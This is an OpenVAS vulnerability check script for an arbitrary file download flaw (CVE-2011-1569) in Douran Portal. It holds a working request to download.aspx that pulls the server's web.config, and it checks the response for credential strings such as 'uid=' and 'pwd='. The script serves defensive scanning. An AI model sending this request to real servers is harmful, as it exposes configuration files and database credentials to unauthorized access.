###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_douran_46927.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# Douran Portal 'download.aspx' Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Douran Portal is prone to a vulnerability that lets attackers download
arbitrary files. This issue occurs because the application fails to
sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary files
within the context of the application. Information harvested may aid
in launching further attacks.

Douran Portal 3.9.7.8 is affected; other versions may also be
vulnerable.";


if (description)
{
 script_id(103120);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2011-1569");
 script_bugtraq_id(46927);

 script_name("Douran Portal 'download.aspx' Arbitrary File Download Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if installed Douran uis vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46927");
 script_xref(name : "URL" , value : "http://www.douran.com/HomePage.aspx?TabID=3901&Site=DouranPortal&Lang=en-US");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = string('/download.aspx?FilePathAttach=/&FileNameAttach=web.config\\.&OriginalAttachFileName=secretfile.txt'); 

if(http_vuln_check(port:port, url:url,pattern:"<configSections>",extra_check:make_list("uid=","pwd=","DouranLogLocation","EnableErrorLog","DouranPortalConfigUpdated"))) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
